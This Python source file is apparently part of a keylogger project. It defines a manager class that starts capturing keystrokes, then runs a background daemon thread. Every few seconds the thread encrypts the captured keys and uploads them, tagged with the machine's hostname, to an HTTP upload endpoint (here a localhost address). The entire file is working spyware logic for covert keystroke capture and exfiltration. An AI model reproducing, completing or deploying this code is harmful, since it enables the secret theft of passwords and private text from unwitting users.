from keylogger.keylogger_servise.keylogger_servise import KeyLogger
from keylogger.writer.network_writer import NetworkWriter
from keylogger.encryption.encryption import Encryption
import time
import threading
import platform


class KeyLoggerManager:
    def __init__(self, interval: int = 5):
        self.keylogger = KeyLogger()
        self.writer = NetworkWriter('http://127.0.0.1:5000/api/upload')
        self.encryptor = Encryption()
        self.interval = interval
        self.running = False
        self.thread = None
        self.machine_name = platform.node() 

    def _loop(self):
        while self.running:
            time.sleep(self.interval)
            events = self.keylogger.get_events()
            if events:
                data = "".join(events)
                encrypted_data = self.encryptor.encrypt(data)
                self.writer.send_data(encrypted_data, self.machine_name)

    def start(self):
        if not self.running:
            self.keylogger.start_logging()
            self.running = True
            self.thread = threading.Thread(target=self._loop, daemon=True)
            self.thread.start()

    def stop(self):
        if self.running:
            self.running = False
            self.keylogger.stop_logging()
            if self.thread:
                self.thread.join()
        